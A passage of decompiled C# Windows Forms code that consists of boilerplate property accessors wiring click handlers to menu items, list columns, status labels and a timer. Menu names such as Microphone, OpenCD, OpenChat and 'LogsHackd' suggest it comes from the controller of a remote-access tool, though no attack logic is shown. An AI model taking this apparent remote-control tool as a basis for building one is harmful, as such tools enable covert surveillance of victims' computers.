				this._MensagemChatToolStripMenuItem = value;
				flag = (this._MensagemChatToolStripMenuItem != null);
				if (flag)
				{
					this._MensagemChatToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click_1);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				flag = (this._ToolStripMenuItem1 != null);
				if (flag)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem3_Click_1);
				bool flag = this._ToolStripMenuItem3 != null;
				if (flag)
				{
					this._ToolStripMenuItem3.Click -= value2;
				}
				this._ToolStripMenuItem3 = value;
				flag = (this._ToolStripMenuItem3 != null);
				if (flag)
				{
					this._ToolStripMenuItem3.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripMenuItem8 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem13_Click);
				bool flag = this._ToolStripMenuItem13 != null;
				if (flag)
				{
					this._ToolStripMenuItem13.Click -= value2;
				}
				this._ToolStripMenuItem13 = value;
				flag = (this._ToolStripMenuItem13 != null);
				if (flag)
				{
					this._ToolStripMenuItem13.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem14_Click);
				bool flag = this._ToolStripMenuItem14 != null;
				if (flag)
				{
					this._ToolStripMenuItem14.Click -= value2;
				}
				this._ToolStripMenuItem14 = value;
				flag = (this._ToolStripMenuItem14 != null);
				if (flag)
				{
					this._ToolStripMenuItem14.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem15_Click);
				bool flag = this._ToolStripMenuItem15 != null;
				if (flag)
				{
					this._ToolStripMenuItem15.Click -= value2;
				}
				this._ToolStripMenuItem15 = value;
				flag = (this._ToolStripMenuItem15 != null);
				if (flag)
				{
					this._ToolStripMenuItem15.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem16_Click);
				bool flag = this._ToolStripMenuItem16 != null;
				if (flag)
				{
					this._ToolStripMenuItem16.Click -= value2;
				}
				this._ToolStripMenuItem16 = value;
				flag = (this._ToolStripMenuItem16 != null);
				if (flag)
				{
					this._ToolStripMenuItem16.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem17_Click);
				bool flag = this._ToolStripMenuItem17 != null;
				if (flag)
				{
					this._ToolStripMenuItem17.Click -= value2;
				}
				this._ToolStripMenuItem17 = value;
				flag = (this._ToolStripMenuItem17 != null);
				if (flag)
				{
					this._ToolStripMenuItem17.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem MicrophoneToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MicrophoneToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MicrophoneToolStripMenuItem_Click);
				bool flag = this._MicrophoneToolStripMenuItem != null;
				if (flag)
				{
					this._MicrophoneToolStripMenuItem.Click -= value2;
				}
				this._MicrophoneToolStripMenuItem = value;
				flag = (this._MicrophoneToolStripMenuItem != null);
				if (flag)
				{
					this._MicrophoneToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem18_Click);
				bool flag = this._ToolStripMenuItem18 != null;
				if (flag)
				{
					this._ToolStripMenuItem18.Click -= value2;
				}
				this._ToolStripMenuItem18 = value;
				flag = (this._ToolStripMenuItem18 != null);
				if (flag)
				{
					this._ToolStripMenuItem18.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem19_Click);
				bool flag = this._ToolStripMenuItem19 != null;
				if (flag)
				{
					this._ToolStripMenuItem19.Click -= value2;
				}
				this._ToolStripMenuItem19 = value;
				flag = (this._ToolStripMenuItem19 != null);
				if (flag)
				{
					this._ToolStripMenuItem19.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem20_Click);
				bool flag = this._ToolStripMenuItem20 != null;
				if (flag)
				{
					this._ToolStripMenuItem20.Click -= value2;
				}
				this._ToolStripMenuItem20 = value;
				flag = (this._ToolStripMenuItem20 != null);
				if (flag)
				{
					this._ToolStripMenuItem20.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem21_Click);
				bool flag = this._ToolStripMenuItem21 != null;
				if (flag)
				{
					this._ToolStripMenuItem21.Click -= value2;
				}
				this._ToolStripMenuItem21 = value;
				flag = (this._ToolStripMenuItem21 != null);
				if (flag)
				{
					this._ToolStripMenuItem21.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripMenuItem22 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem23_Click);
				bool flag = this._ToolStripMenuItem23 != null;
				if (flag)
				{
					this._ToolStripMenuItem23.Click -= value2;
				}
				this._ToolStripMenuItem23 = value;
				flag = (this._ToolStripMenuItem23 != null);
				if (flag)
				{
					this._ToolStripMenuItem23.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem24
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem24;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem24_Click);
				bool flag = this._ToolStripMenuItem24 != null;
				if (flag)
				{
					this._ToolStripMenuItem24.Click -= value2;
				}
				this._ToolStripMenuItem24 = value;
				flag = (this._ToolStripMenuItem24 != null);
				if (flag)
				{
					this._ToolStripMenuItem24.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem25
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem25;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem25_Click);
				bool flag = this._ToolStripMenuItem25 != null;
				if (flag)
				{
					this._ToolStripMenuItem25.Click -= value2;
				}
				this._ToolStripMenuItem25 = value;
				flag = (this._ToolStripMenuItem25 != null);
				if (flag)
				{
					this._ToolStripMenuItem25.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem26_Click);
				bool flag = this._ToolStripMenuItem26 != null;
				if (flag)
				{
					this._ToolStripMenuItem26.Click -= value2;
				}
				this._ToolStripMenuItem26 = value;
				flag = (this._ToolStripMenuItem26 != null);
				if (flag)
				{
					this._ToolStripMenuItem26.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem27
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem27;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem27_Click);
				bool flag = this._ToolStripMenuItem27 != null;
				if (flag)
				{
					this._ToolStripMenuItem27.Click -= value2;
				}
				this._ToolStripMenuItem27 = value;
				flag = (this._ToolStripMenuItem27 != null);
				if (flag)
				{
					this._ToolStripMenuItem27.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem28
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem28;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem28_Click);
				bool flag = this._ToolStripMenuItem28 != null;
				if (flag)
				{
					this._ToolStripMenuItem28.Click -= value2;
				}
				this._ToolStripMenuItem28 = value;
				flag = (this._ToolStripMenuItem28 != null);
				if (flag)
				{
					this._ToolStripMenuItem28.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem29
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem29;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem29_Click);
				bool flag = this._ToolStripMenuItem29 != null;
				if (flag)
				{
					this._ToolStripMenuItem29.Click -= value2;
				}
				this._ToolStripMenuItem29 = value;
				flag = (this._ToolStripMenuItem29 != null);
				if (flag)
				{
					this._ToolStripMenuItem29.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem YYToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._YYToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.YYToolStripMenuItem_Click);
				bool flag = this._YYToolStripMenuItem != null;
				if (flag)
				{
					this._YYToolStripMenuItem.Click -= value2;
				}
				this._YYToolStripMenuItem = value;
				flag = (this._YYToolStripMenuItem != null);
				if (flag)
				{
					this._YYToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ComputadorToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComputadorToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComputadorToolStripMenuItem1 = value;
			}
		}

		internal virtual ToolStripMenuItem RefreshToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem1_Click);
				bool flag = this._RefreshToolStripMenuItem1 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem1.Click -= value2;
				}
				this._RefreshToolStripMenuItem1 = value;
				flag = (this._RefreshToolStripMenuItem1 != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem30
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem30;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem30_Click);
				bool flag = this._ToolStripMenuItem30 != null;
				if (flag)
				{
					this._ToolStripMenuItem30.Click -= value2;
				}
				this._ToolStripMenuItem30 = value;
				flag = (this._ToolStripMenuItem30 != null);
				if (flag)
				{
					this._ToolStripMenuItem30.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem CDPlayerToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CDPlayerToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CDPlayerToolStripMenuItem1 = value;
			}
		}

		internal virtual ToolStripMenuItem OpenCDToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenCDToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenCDToolStripMenuItem1_Click);
				bool flag = this._OpenCDToolStripMenuItem1 != null;
				if (flag)
				{
					this._OpenCDToolStripMenuItem1.Click -= value2;
				}
				this._OpenCDToolStripMenuItem1 = value;
				flag = (this._OpenCDToolStripMenuItem1 != null);
				if (flag)
				{
					this._OpenCDToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem GGGToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GGGToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GGGToolStripMenuItem_Click);
				bool flag = this._GGGToolStripMenuItem != null;
				if (flag)
				{
					this._GGGToolStripMenuItem.Click -= value2;
				}
				this._GGGToolStripMenuItem = value;
				flag = (this._GGGToolStripMenuItem != null);
				if (flag)
				{
					this._GGGToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem GGToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GGToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GGToolStripMenuItem_Click);
				bool flag = this._GGToolStripMenuItem != null;
				if (flag)
				{
					this._GGToolStripMenuItem.Click -= value2;
				}
				this._GGToolStripMenuItem = value;
				flag = (this._GGToolStripMenuItem != null);
				if (flag)
				{
					this._GGToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem IndexFileToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IndexFileToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.IndexFileToolStripMenuItem1_Click);
				bool flag = this._IndexFileToolStripMenuItem1 != null;
				if (flag)
				{
					this._IndexFileToolStripMenuItem1.Click -= value2;
				}
				this._IndexFileToolStripMenuItem1 = value;
				flag = (this._IndexFileToolStripMenuItem1 != null);
				if (flag)
				{
					this._IndexFileToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem OpenChatToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenChatToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenChatToolStripMenuItem1_Click);
				bool flag = this._OpenChatToolStripMenuItem1 != null;
				if (flag)
				{
					this._OpenChatToolStripMenuItem1.Click -= value2;
				}
				this._OpenChatToolStripMenuItem1 = value;
				flag = (this._OpenChatToolStripMenuItem1 != null);
				if (flag)
				{
					this._OpenChatToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem LogsHackdToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogsHackdToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LogsHackdToolStripMenuItem_Click);
				bool flag = this._LogsHackdToolStripMenuItem != null;
				if (flag)
				{
					this._LogsHackdToolStripMenuItem.Click -= value2;
				}
				this._LogsHackdToolStripMenuItem = value;
				flag = (this._LogsHackdToolStripMenuItem != null);
				if (flag)
				{
					this._LogsHackdToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual LV L2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._L2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader12 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader13 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader6 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader7 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader8 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader9 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader10 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader11 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader21 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader22 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader23 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader24
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader24;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader24 = value;
			}
		}

		internal virtual Panel Panel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel3 = value;
			}
		}

		internal virtual L1V L1V
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1V;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._L1V = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader14 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader15 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader16 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader17 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader18 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader19 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader20 = value;
			}
		}

		internal virtual TextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		internal virtual ToolStripStatusLabel ToStael1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToStael1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel1_Click);
				bool flag = this._ToStael1 != null;
				if (flag)
				{
					this._ToStael1.Click -= value2;
				}
				this._ToStael1 = value;
				flag = (this._ToStael1 != null);
				if (flag)
				{
					this._ToStael1.Click += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel3_Click_1);
				bool flag = this._ToolStripStatusLabel3 != null;
				if (flag)
				{
					this._ToolStripStatusLabel3.Click -= value2;
				}
				this._ToolStripStatusLabel3 = value;
				flag = (this._ToolStripStatusLabel3 != null);
				if (flag)
				{
					this._ToolStripStatusLabel3.Click += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel5_Click);
				bool flag = this._ToolStripStatusLabel5 != null;
				if (flag)
				{
					this._ToolStripStatusLabel5.Click -= value2;
				}
				this._ToolStripStatusLabel5 = value;
				flag = (this._ToolStripStatusLabel5 != null);
				if (flag)
				{
					this._ToolStripStatusLabel5.Click += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel4_Click_1);
				bool flag = this._ToolStripStatusLabel4 != null;
				if (flag)
				{
					this._ToolStripStatusLabel4.Click -= value2;
				}
				this._ToolStripStatusLabel4 = value;
				flag = (this._ToolStripStatusLabel4 != null);
				if (flag)
				{
					this._ToolStripStatusLabel4.Click += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel conz
		{
			[DebuggerNonUserCode]
			get
			{
				return this._conz;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.conz_Click);
				bool flag = this._conz != null;
				if (flag)
				{
					this._conz.Click -= value2;
				}
				this._conz = value;
				flag = (this._conz != null);
				if (flag)
				{
					this._conz.Click += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel upl
		{
			[DebuggerNonUserCode]
			get
			{
				return this._upl;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.upl_Click);
				bool flag = this._upl != null;
				if (flag)
				{
					this._upl.Click -= value2;
				}
				this._upl = value;
				flag = (this._upl != null);
				if (flag)
				{
					this._upl.Click += value2;
				}
			}
		}

		internal virtual ToolStripStatusLabel dwn
		{
			[DebuggerNonUserCode]
			get
			{
				return this._dwn;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._dwn = value;
			}
		}

		internal virtual ToolStripStatusLabel To2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._To2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._To2 = value;
			}
		}

		internal virtual ToolStripStatusLabel Tool1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Tool1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Tool1 = value;
			}
		}

		internal virtual System.Windows.Forms.Timer Timer4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer4_Tick);
				bool flag = this._Timer4 != null;
				if (flag)
				{
					this._Timer4.Tick -= value2;
				}
				this._Timer4 = value;
